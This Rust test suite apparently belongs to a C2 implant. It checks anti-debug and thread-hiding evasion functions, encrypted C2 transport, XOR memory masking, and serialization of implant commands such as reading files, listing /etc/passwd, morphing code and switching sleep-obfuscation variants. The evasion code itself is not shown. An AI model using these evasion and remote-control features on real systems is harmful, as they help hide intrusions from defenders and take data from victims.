//! Internal test harness for evasion functionality.
//!
//! Exercises the cross-platform evasion primitives (`with_scrubbed_debug_regs`,
//! `spawn_hidden_thread`, `hide_current_thread`, `disable_evasion`) that have
//! real (non-mock) implementations on every platform, as well as the
//! AES-256-GCM `CryptoSession` encrypt/decrypt roundtrip that underpins the
//! C2 transport layer.

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

// ── 1. CryptoSession encrypt/decrypt roundtrip (AES-256-GCM) ──────────

/// Verify that a freshly-created `CryptoSession` can encrypt and then
/// decrypt a payload, producing the original plaintext.
#[test]
fn crypto_session_roundtrip() {
    let session = common::CryptoSession::from_shared_secret(b"evasion-test-key");

    let plaintext = b"The quick brown fox jumps over the lazy dog";
    let ciphertext = session.encrypt(plaintext);
    // Ciphertext must differ from plaintext.
    assert_ne!(
        ciphertext.as_slice(),
        plaintext.as_slice(),
        "ciphertext must not equal plaintext"
    );
    // Ciphertext must be longer than plaintext (nonce + tag overhead).
    assert!(
        ciphertext.len() > plaintext.len(),
        "ciphertext should be longer than plaintext due to nonce + tag"
    );

    let decrypted = session
        .decrypt(&ciphertext)
        .expect("decryption should succeed with the same session");
    assert_eq!(
        decrypted.as_slice(),
        plaintext.as_slice(),
        "decrypted plaintext must match original"
    );
}

/// Encrypting two identical payloads must produce different ciphertext
/// (unique nonce per encryption call).
#[test]
fn crypto_session_unique_ciphertexts() {
    let session = common::CryptoSession::from_shared_secret(b"nonce-uniqueness-test");
    let plaintext = b"same same";

    let ct1 = session.encrypt(plaintext);
    let ct2 = session.encrypt(plaintext);

    assert_ne!(
        ct1.as_slice(),
        ct2.as_slice(),
        "two encryptions of the same plaintext must produce different ciphertexts"
    );

    // Both must still decrypt correctly.
    assert_eq!(session.decrypt(&ct1).unwrap().as_slice(), plaintext.as_slice());
    assert_eq!(session.decrypt(&ct2).unwrap().as_slice(), plaintext.as_slice());
}

/// Empty plaintext should still encrypt/decrypt successfully.
#[test]
fn crypto_session_empty_plaintext() {
    let session = common::CryptoSession::from_shared_secret(b"empty-pt");
    let ct = session.encrypt(b"");
    // Even empty plaintext produces nonce(12) + tag(16) = 28 bytes minimum.
    // Plus salt(32) prefix from wire format.
    assert!(
        !ct.is_empty(),
        "ciphertext of empty plaintext should not be empty (contains nonce + tag + optional salt)"
    );
    let pt = session.decrypt(&ct).expect("decrypt empty plaintext");
    assert!(pt.is_empty(), "decrypted empty plaintext should be empty");
}

/// Sessions created with different secrets must not be able to decrypt each
/// other's messages.  Two `from_shared_secret` sessions sharing the *same*
/// secret **can** interoperate (the decrypt path re-derives the key from the
/// embedded salt), so we use `from_key` with different keys to test isolation.
#[test]
fn crypto_session_key_isolation() {
    let s1 = common::CryptoSession::from_key([0x11u8; 32]);
    let s2 = common::CryptoSession::from_key([0x22u8; 32]);

    let ct = s1.encrypt(b"secret message");
    // s2 has a different key, so decryption should fail.
    let result = s2.decrypt(&ct);
    assert!(
        result.is_err(),
        "sessions with different keys must not decrypt each other's ciphertexts"
    );
}

/// Sessions created from the same secret *and* the same salt should be
/// able to decrypt each other's messages.
#[test]
fn crypto_session_same_salt_interop() {
    let salt = [0xAB; 32];
    let s1 = common::CryptoSession::from_shared_secret_with_salt(b"shared", &salt);
    let s2 = common::CryptoSession::from_shared_secret_with_salt(b"shared", &salt);

    let ct = s1.encrypt(b"hello from s1");
    let pt = s2.decrypt(&ct).expect("s2 should decrypt s1's message");
    assert_eq!(pt.as_slice(), b"hello from s1");
}

// ── 2. with_scrubbed_debug_regs (cross-platform) ──────────────────────

/// `with_scrubbed_debug_regs` must execute the closure and return its
/// result unmodified.
#[test]
fn scrubbed_debug_regs_returns_closure_result() {
    let val = agent::evasion::with_scrubbed_debug_regs(|| 42_u64);
    assert_eq!(val, 42, "with_scrubbed_debug_regs should return closure result");
}

/// `with_scrubbed_debug_regs` must propagate panics from the closure.
#[test]
#[should_panic(expected = "test-panic")]
fn scrubbed_debug_regs_propagates_panic() {
    agent::evasion::with_scrubbed_debug_regs(|| {
        panic!("test-panic");
    });
}

/// `with_scrubbed_debug_regs` must work with mutable borrows and side-effects.
#[test]
fn scrubbed_debug_regs_allows_mutation() {
    let mut buf = vec![0u8; 16];
    agent::evasion::with_scrubbed_debug_regs(|| {
        for (i, b) in buf.iter_mut().enumerate() {
            *b = i as u8;
        }
    });
    assert_eq!(buf[0], 0);
    assert_eq!(buf[15], 15);
}

/// Nested calls to `with_scrubbed_debug_regs` must not deadlock.
#[test]
fn scrubbed_debug_regs_nested_no_deadlock() {
    let result = agent::evasion::with_scrubbed_debug_regs(|| {
        agent::evasion::with_scrubbed_debug_regs(|| {
            agent::evasion::with_scrubbed_debug_regs(|| 99)
        })
    });
    assert_eq!(result, 99);
}

// ── 3. spawn_hidden_thread (cross-platform) ───────────────────────────

/// `spawn_hidden_thread` must execute the closure in a separate thread and
/// return the correct result.
#[test]
fn spawn_hidden_thread_returns_value() {
    let handle = agent::evasion::spawn_hidden_thread(|| {
        std::thread::sleep(std::time::Duration::from_millis(10));
        7_u32
    });
    let val = handle.join().expect("thread should not panic");
    assert_eq!(val, 7, "spawn_hidden_thread should return closure value");
}

/// `spawn_hidden_thread` should successfully hide multiple concurrent
/// threads and collect their results.
#[test]
fn spawn_hidden_thread_multiple() {
    let counter = Arc::new(AtomicUsize::new(0));
    let mut handles = Vec::new();
    for _ in 0..8 {
        let c = counter.clone();
        handles.push(agent::evasion::spawn_hidden_thread(move || {
            c.fetch_add(1, Ordering::SeqCst);
        }));
    }
    for h in handles {
        h.join().expect("thread should not panic");
    }
    assert_eq!(counter.load(Ordering::SeqCst), 8);
}

// ── 4. hide_current_thread / disable_evasion (cross-platform) ──────────

/// `hide_current_thread` must not panic on any platform (no-op on non-Windows).
#[test]
fn hide_current_thread_does_not_panic() {
    agent::evasion::hide_current_thread();
    // If we got here, it didn't panic.
}

/// `disable_evasion` must not panic on any platform (no-op on non-Windows).
#[test]
fn disable_evasion_does_not_panic() {
    // SAFETY: on non-Windows this is a no-op; on Windows it only removes
    // a VEH handler (which we haven't installed in a test context, so it's
    // a safe no-op there too).
    unsafe {
        agent::evasion::disable_evasion();
    }
}

// ── 5. XOR-based memory encryption simulation ──────────────────────────

/// Simulate the memory guard's XOR-based encryption cycle and verify that
/// plaintext is not present in encrypted memory, then restored on decrypt.
#[test]
fn xor_memory_guard_simulation_roundtrip() {
    let original: Vec<u8> = (0..=255).collect();
    let mut buffer = original.clone();

    // Encrypt with XOR key.
    let key: u8 = 0xAA;
    for byte in &mut buffer {
        *byte ^= key;
    }

    // After XOR encryption, buffer must differ from original.
    assert_ne!(buffer, original, "encrypted buffer must differ from original");

    // Decrypt.
    for byte in &mut buffer {
        *byte ^= key;
    }
    assert_eq!(buffer, original, "decrypted buffer must match original");
}

/// Verify that XOR encryption with a multi-byte key works correctly.
#[test]
fn xor_memory_guard_multi_byte_key() {
    let original = b"sensitive data that must be encrypted".to_vec();
    let key = b"\xDE\xAD\xBE\xEF";
    let mut encrypted = original.clone();

    // Encrypt with rotating key.
    for (i, byte) in encrypted.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }

    // Verify no plaintext patterns remain.
    assert_ne!(encrypted, original);

    // Decrypt.
    for (i, byte) in encrypted.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
    assert_eq!(encrypted, original);
}

// ── 6. Large payload encrypt/decrypt ───────────────────────────────────

/// Stress-test the CryptoSession with a large payload.
#[test]
fn crypto_session_large_payload() {
    let session = common::CryptoSession::from_shared_secret(b"large-payload-key");
    let payload: Vec<u8> = (0..65_536).map(|i| (i % 256) as u8).collect();
    let ct = session.encrypt(&payload);
    let pt = session.decrypt(&ct).expect("large payload decrypt");
    assert_eq!(pt.len(), 65_536);
    assert_eq!(pt, payload);
}

// ── 7. Command serialization roundtrip ─────────────────────────────────

/// Verify that all non-feature-gated Command variants survive a
/// serde_json serialize → deserialize roundtrip without data loss.
#[test]
fn command_serde_roundtrip_basic_variants() {
    use common::Command;

    let commands: Vec<Command> = vec![
        Command::Ping,
        Command::GetSystemInfo,
        Command::Shutdown,
        Command::ListDirectory { path: "/etc/passwd".into() },
        Command::ReadFile { path: "/tmp/test".into() },
        Command::WriteFile { path: "/tmp/out".into(), content: b"hello".to_vec() },
        Command::ReloadConfig,
        Command::ListProcesses,
        Command::ListPlugins,
        Command::ShellList,
        Command::ListTopology,
        Command::ListLinks,
        Command::SetReencodeSeed { seed: 0xDEADBEEF },
        Command::MorphNow { seed: 12345 },
        Command::SetSleepVariant { variant: "ekko".into() },
        Command::JobStatus { job_id: "job-42".into() },
        Command::GetPluginInfo { plugin_id: "my-plugin".into() },
        Command::UnloadPlugin { plugin_id: "old-plugin".into() },
        Command::Unlink { link_id: Some(7) },
        Command::Unlink { link_id: None },
        Command::MeshKillSwitch,
    ];

    for original in &commands {
        let json = serde_json::to_string(original).expect("serialize command");
        let roundtripped: Command =
            serde_json::from_str(&json).expect("deserialize command");
        // Re-serialize the roundtripped value and compare JSON strings
        // (simpler than deriving PartialEq for the whole enum).
        let json2 = serde_json::to_string(&roundtripped).expect("re-serialize");
        assert_eq!(
            json, json2,
            "Command serde roundtrip failed for variant: {:?}",
            serde_json::to_string(original).unwrap()
        );
    }
}
